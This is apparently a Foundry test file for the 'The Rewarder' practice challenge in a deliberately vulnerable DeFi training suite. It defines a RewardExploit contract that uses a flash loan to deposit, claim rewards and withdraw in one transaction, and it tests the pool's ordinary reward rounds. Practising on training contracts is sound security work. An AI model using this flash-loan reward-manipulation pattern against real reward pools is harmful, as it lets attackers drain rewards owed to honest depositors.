// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {TheRewarderPool} from "../../src/rewarder/TheRewarderPool.sol";
import {FlashLoanerPool} from "../../src/rewarder/FlashLoanerPool.sol";
import {RewardToken} from "../../src/rewarder/RewardToken.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import "solady/src/utils/FixedPointMathLib.sol";

interface IDamnValuableToken {
    function transfer(address, uint256) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function approve(address, uint256) external returns (bool);
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;

    function distributeRewards() external returns (uint256 rewards);
}

contract RewardExploit {
    uint256 FLASHLOAN_BALANCE = 10_000e18;

    address flashLoanerPool;
    address rewarderPool;
    address liquidityToken;

    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        address _liquidityToken
    ) {
        flashLoanerPool = _flashLoanerPool;
        rewarderPool = _rewarderPool;
        liquidityToken = _liquidityToken;
    }

    function exploit(uint256 amount) external {
        IFlashLoanerPool(flashLoanerPool).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        IDamnValuableToken(liquidityToken).approve(
            address(rewarderPool),
            amount
        );
        ITheRewarderPool(rewarderPool).deposit(amount);
        ITheRewarderPool(rewarderPool).distributeRewards();
        ITheRewarderPool(rewarderPool).withdraw(amount);

        IDamnValuableToken(liquidityToken).transfer(
            address(flashLoanerPool),
            amount
        );
    }
}

contract RewarderTest is Test {
    using FixedPointMathLib for uint256;
    uint256 FLASHLOAN_BALANCE = 10_000e18;
    TheRewarderPool pool;
    FlashLoanerPool flashLoanerPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;
    RewardExploit rewardExploit;

    address alice;
    address bob;
    address charlie;
    address david;

    // uint256 TOKEN_BALANCE = 1_000_000e18; // 1 million DVT

    function setUp() public {
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");
        david = makeAddr("david");

        liquidityToken = new DamnValuableToken();
        pool = new TheRewarderPool(address(liquidityToken));
        flashLoanerPool = new FlashLoanerPool(address(liquidityToken));
        rewardExploit = new RewardExploit(
            address(flashLoanerPool),
            address(pool),
            address(liquidityToken)
        );
    }

    function testExploitSubRewarder() public {
        // Setup////////////
        liquidityToken.approve(address(pool), type(uint256).max);
        uint256 time = 5 days;
        ++time;
        assertEq(pool.isNewRewardsRound(), false);
        assertEq(pool.roundNumber(), 1);
        uint256 deposit = 1 ether;
        ////////////////////

        // Round 1 claim distribution ////////////
        pool.deposit(deposit);
        assertEq(pool.isNewRewardsRound(), false);
        assertEq(block.timestamp, 1);
        assertEq(pool.lastRecordedSnapshotTimestamp(), 1);
        vm.warp(time);
        assertEq(pool.isNewRewardsRound(), true);
        pool.distributeRewards();
        uint256 rewardsTotalSupply = deposit.mulDiv(100 ether, 1 ether);
        assertEq(rewardsTotalSupply, pool.rewardToken().totalSupply());
        //////////////////////////////////////////

        // Round 2 claim distribution ////////////
        pool.deposit(deposit);
        assertEq(pool.isNewRewardsRound(), false);
        vm.warp(time * 2);
        assertEq(pool.lastRecordedSnapshotTimestamp(), time);
        assertEq(pool.isNewRewardsRound(), true);
        assertEq(pool.roundNumber(), 2);
        pool.distributeRewards();
        rewardsTotalSupply = (deposit * 2).mulDiv(100 ether, 1 ether);
        assertEq(rewardsTotalSupply, pool.rewardToken().totalSupply());
        //////////////////////////////////////////

        // Round 3 claim distribution ////////////
        pool.deposit(deposit);
        assertEq(pool.isNewRewardsRound(), false);
        vm.warp(time * 3);
        assertEq(pool.lastRecordedSnapshotTimestamp(), time * 2);
        assertEq(pool.isNewRewardsRound(), true);
        assertEq(pool.roundNumber(), 3);
        pool.distributeRewards();
        rewardsTotalSupply = (deposit * 3).mulDiv(100 ether, 1 ether);
        assertEq(rewardsTotalSupply, pool.rewardToken().totalSupply());
        //////////////////////////////////////////

        assertEq(pool.REWARDS(), 100 ether);
    }
}
